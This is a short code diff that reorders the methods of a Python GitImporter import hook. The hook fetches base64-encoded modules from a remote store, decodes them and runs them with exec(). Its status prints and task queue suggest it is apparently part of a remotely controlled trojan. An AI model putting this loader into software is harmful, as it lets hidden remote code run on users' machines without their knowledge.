@@ -109,6 +109,16 @@ class GitImporter(Loader, MetaPathFinder):
         self.current_module_code = ""
 
     @classmethod
+    def find_spec(cls, fullname, path=None, target=None):
+        if configured:
+            print("[*] Attempting to retrive %s" % fullname)
+            new_library = get_file_contents("modules/%s" % fullname)
+            if new_library is not None:
+                cls.current_module_code = base64.b64decode(new_library)
+                return ModuleSpec(fullname,cls)
+        return None
+
+    @classmethod
     def create_module(cls, spec):
         if spec.name in sys.modules:
             module = importlib.util.module_from_spec(spec)
@@ -120,16 +130,6 @@ class GitImporter(Loader, MetaPathFinder):
     @classmethod
     def exec_module(cls,module):
         exec(cls.current_module_code, module.__dict__)
-
-    @classmethod
-    def find_spec(cls, fullname, path=None, target=None):
-        if configured:
-            print("[*] Attempting to retrive %s" % fullname)
-            new_library = get_file_contents("modules/%s" % fullname)
-            if new_library is not None:
-                cls.current_module_code = base64.b64decode(new_library)
-                return ModuleSpec(fullname,cls)
-        return None
 
 def module_runner(module):
     task_queue.put(1)
